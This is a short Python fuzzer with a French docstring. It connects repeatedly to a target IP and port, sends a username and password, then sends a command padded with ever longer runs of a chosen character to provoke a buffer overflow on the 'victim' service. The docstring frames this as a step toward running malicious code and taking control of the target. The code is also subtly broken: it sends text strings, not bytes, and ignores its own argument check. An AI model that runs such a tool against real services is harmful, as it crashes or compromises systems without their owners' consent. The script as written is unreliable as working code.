
"""
    Le fuzzing est un identificateur de vulnérabilités de type buffer overflow ou dépassement de tampon.
    Cette attaque a dépassé l'espace octroyé à l'écriture d'une variable et donc écrire dans une zone de la mémoire
    qui n'est pas reservée à cette dernière. Ceci peut nous permettre de réaliser un bon nombre d'actions et ce n'est pas
    seulement reservé aux aspects applicatifs mais peut également être utilisé pour les attaques Web.
    L'attaque consiste à envoyer un bon nombre des données aléatoires pour provoquer une surchage de la mémoire et nous
    permettra d'executer un code malicieux pour prendre le controle de notre cible.

"""
import socket
import sys

if len(sys.argv) != 6:
    print("Using ./fuzzer.py [IP] [PORT] [PAYLOAD] [INTERVALL] [MAXIMUM]")
target = str(sys.argv[1])
port = int(sys.argv[2])
char = str(sys.argv[3])
intervall = int(sys.argv[4])
i = int(sys.argv[4])
max = int(sys.argv[5])
username = input("Put the username")
password = input("Put your password")
command = input("Enter your fuzzer command")
while i <= max:
    try:
        payload = command + " " + (char*i)
        print("Send :" + str(i) + "Instances of Payload :" + char + "To victim destination")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((target, port))
        s.recv(1024)
        s.send("Username"+username+"\r\n")
        s.recv(1024)
        s.send("Password"+password+"\r\n")
        s.recv(1024)
        s.send(payload+"\r\n")
        s.send("Quit\r\n")
        s.recv(1024)
        s.close()
        i += intervall
    except:
        print("Impossible to send data, server may be traf")
    print("Victim always actif")